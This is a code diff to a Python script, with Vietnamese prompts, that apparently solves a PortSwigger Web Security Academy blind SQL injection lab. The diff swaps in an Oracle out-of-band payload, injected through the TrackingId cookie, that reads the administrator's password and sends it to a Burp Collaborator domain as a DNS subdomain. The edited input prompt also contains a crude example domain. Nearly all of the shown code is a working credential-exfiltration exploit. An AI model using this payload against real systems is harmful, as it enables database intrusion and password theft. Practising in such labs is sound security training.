@@ -4,7 +4,7 @@ import requests
 print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
 base_url = input("Nhập URL: ").rstrip("/")
 
-collab_domain = input("Nhập domain Burp Collaborator (ví dụ abcdef.burpcollaborator.net): ").strip()
+collab_domain = input("Nhập domain Burp Collaborator (gaysex.burpcollaborator.net): ").strip()
 
 session = requests.Session()
 res = session.get(base_url)
@@ -12,9 +12,7 @@ res = session.get(base_url)
 tracking_id = res.cookies.get("TrackingId")
 session_id = res.cookies.get("session")
 
-payload = f"{tracking_id}'||(SELECT+EXISTS(SELECT+1+FROM+users+WHERE+username='administrator'+AND+1=CAST((SELECT+pg_sleep(1)+FROM+users)+AS+INT)))||'"
-
-payload = f"{tracking_id}'||(SELECT+extractvalue(xmltype('<!DOCTYPE+root+[<!ENTITY+%25+ext+SYSTEM+\"http://{collab_domain}\">]>'),'/l')+FROM+dual)||'"
+payload = f"'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.{collab_domain}/\">+%25remote%3b]>'),'/l')+FROM+dual--"
 
 cookies = {
     "TrackingId": payload,
